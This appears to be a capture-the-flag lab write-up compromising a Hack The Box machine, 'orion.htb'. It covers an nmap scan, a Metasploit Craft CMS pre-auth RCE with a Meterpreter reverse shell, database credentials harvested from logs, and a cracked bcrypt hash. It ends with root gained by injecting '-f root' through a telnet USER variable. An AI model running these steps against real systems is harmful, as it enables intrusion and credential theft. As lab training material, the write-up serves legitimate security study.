Let's start with a port scan. 


```bash
nmap -sSVC --open -Pn 10.129.82.181
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 16:52 -0400
Nmap scan report for 10.129.82.181
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
```

Let's check the website. And add orion.thb to the /etc/hosts


since it was labeled "easy" i jsut tried http://orion.thb/admin and found a portal

In the bottom it says "craft CMS 5.6.16" and let's search for an exploit for that specific version

https://www.exploit-db.com/exploits/52525

Ok so we have a preauth rce which is good. 

```bash
Attack Vector: An unauthenticated attacker can send a crafted HTTP request (such as a POST request to an image transformation endpoint) to inject and execute arbitrary PHP code.
```


```bash
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
[*] Started reverse TCP handler on 10.10.15.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (45739 bytes) to 10.129.82.181
[*] Meterpreter session 2 opened (10.10.15.128:4444 -> 10.129.82.181:52640) at 2026-07-27 17:01:39 -0400

meterpreter > ls
Listing: /var/www/html/craft/web
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100664/rw-rw-r--  283   fil   2025-11-18 12:08:05 -0500  .htaccess
040755/rwxr-xr-x  4096  dir   2026-03-06 07:12:57 -0500  assets
040775/rwxrwxr-x  4096  dir   2026-07-27 16:53:36 -0400  cpresources
100644/rw-r--r--  9689  fil   2026-03-06 07:12:57 -0500  index.html
100664/rw-rw-r--  258   fil   2025-11-18 12:08:05 -0500  index.php


```


We got RCE. 

After snooping around for a while i was able to find the password in the logs

```bash
  'HTTP_CONTENT_LENGTH' => '202',
    'HTTP_CONTENT_TYPE' => 'application/json',
    'HTTP_X_CSRF_TOKEN' => 'KNywalDLq6myu2alZ5Z7N1o0iHccHpiQKyMOUUiRxv5iHWKYcdX_o169hDIk_J7A5I8p9iPFDEc-WcI1MVj08XpBPzYL1oK2IyQA2wWEj_o=',
    'HTTP_COOKIE' => 'CRAFT_CSRF_TOKEN=6dd28cb9a5f7ab1e08b6dafe99294a6a559cb9e9daba7d919d96162251f2718ea%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22va4Xt75iV4OSDSwpdmJB-FlaQb1gCGDHA9bCtQpY%22%3B%7D; CraftSessionId=1mhn2n523ve439nmrm8lkuovp5',
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'HTTP_HOST' => 'orion.htb',
    'REDIRECT_STATUS' => '200',
    'SERVER_NAME' => 'localhost',
    'SERVER_PORT' => '80',
    'SERVER_ADDR' => '10.129.82.181',
    'REMOTE_USER' => '',
    'REMOTE_PORT' => '41619',
    'REMOTE_ADDR' => '10.10.15.128',
    'SERVER_SOFTWARE' => 'nginx/1.18.0',
    'GATEWAY_INTERFACE' => 'CGI/1.1',
    'REQUEST_SCHEME' => 'http',
    'SERVER_PROTOCOL' => 'HTTP/1.1',
    'DOCUMENT_ROOT' => '/var/www/html/craft/web',
    'DOCUMENT_URI' => '/index.php',
    'REQUEST_URI' => '/index.php?p=admin/actions/assets/generate-transform',
    'SCRIPT_NAME' => '/index.php',
    'CONTENT_LENGTH' => '202',
    'CONTENT_TYPE' => 'application/json',
    'REQUEST_METHOD' => 'POST',
    'QUERY_STRING' => 'p=admin/actions/assets/generate-transform',
    'SCRIPT_FILENAME' => '/var/www/html/craft/web/index.php',
    'PATH_INFO' => '',
    'FCGI_ROLE' => 'RESPONDER',
    'PHP_SELF' => '/index.php',
    'REQUEST_TIME_FLOAT' => 1785186272.169833,
    'REQUEST_TIME' => 1785186272,
    'CRAFT_APP_ID' => 'CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff',
    'CRAFT_ENVIRONMENT' => 'dev',
    'CRAFT_SECURITY_KEY' => 'RRS86F6i2JQKdC6kfEI7frVxA47WVMx8',
    'CRAFT_DEV_MODE' => 'true',
    'CRAFT_ALLOW_ADMIN_CHANGES' => 'true',
    'CRAFT_DISALLOW_ROBOTS' => 'true',
    'CRAFT_DB_DRIVER' => 'mysql',
    'CRAFT_DB_SERVER' => '127.0.0.1',
    'CRAFT_DB_PORT' => '3306',
    'CRAFT_DB_DATABASE' => 'orion',
    'CRAFT_DB_USER' => 'root',
    'CRAFT_DB_PASSWORD' => 'SuperSecureCraft123Pass!',
    'CRAFT_DB_SCHEMA' => '',
    'CRAFT_DB_TABLE_PREFIX' => '',
    'PRIMARY_SITE_URL' => 'http://orion.htb/',

```

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -h 127.0.0.1 -P 3306
```


```bash
select * from users;
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
| id | photoId | affiliatedSiteId | active | pending | locked | suspended | admin | username | fullName | firstName | lastName | email          | password                                                     | lastLoginDate       | lastLoginAttemptIp | invalidLoginWindowStart | invalidLoginCount | lastInvalidLoginDate | lockoutDate | hasDashboard | verificationCode | verificationCodeIssuedDate | unverifiedEmail | passwordResetRequired | lastPasswordChangeDate | dateCreated         | dateUpdated         |
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
|  1 |    NULL |             NULL |      1 |       0 |      0 |         0 |     1 | admin    | NULL     | NULL      | NULL     | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS | 2026-03-12 11:25:04 | NULL               | NULL                    |              NULL | NULL                 | NULL        |            1 | NULL             | NULL                       | NULL            |                     0 | 2026-03-12 11:24:51    | 2026-03-06 11:24:45 | 2026-03-12 11:25:04 |
+----+---------+------------------+--------+---------+--------+-----------+-------+----------+----------+-----------+----------+----------------+--------------------------------------------------------------+---------------------+--------------------+-------------------------+-------------------+----------------------+-------------+--------------+------------------+----------------------------+-----------------+-----------------------+------------------------+---------------------+---------------------+
1 row in set (0.001 sec)


```


```bash
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

we were able to crack it with hashcat. 

```bash
 ssh adam@10.129.82.181  
The authenticity of host '10.129.82.181 (10.129.82.181)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.82.181' (ED25519) to the list of known hosts.
adam@10.129.82.181's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Jul 27 09:17:09 PM UTC 2026

  System load:  0.08              Processes:             222
  Usage of /:   77.4% of 5.81GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.129.82.181
  Swap usage:   0%

  => There is 1 zombie process.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

adam@orion:~$ 

```

Then we started trying to find a way to privesc. 

```bash
tcp          LISTEN        0             10                       127.0.0.1:23                      0.0.0.0:*  
```

There was telnet running on port 23. 

```bash
telnet --version
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

https://nvd.nist.gov/vuln/detail/cve-2026-24061


```bash
telnet
telnet> environ define USER "-f root"
environ export USER
open 127.0.0.1 23telnet> telnet> 
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/2)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Jul 27 09:56:59 PM UTC 2026

  System load:  0.0               Processes:             238
  Usage of /:   88.5% of 5.81GB   Users logged in:       1
  Memory usage: 16%               IPv4 address for eth0: 10.129.82.181
  Swap usage:   0%

  => / is using 88.5% of 5.81GB
  => There is 1 zombie process.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)
root@orion:~# 

```


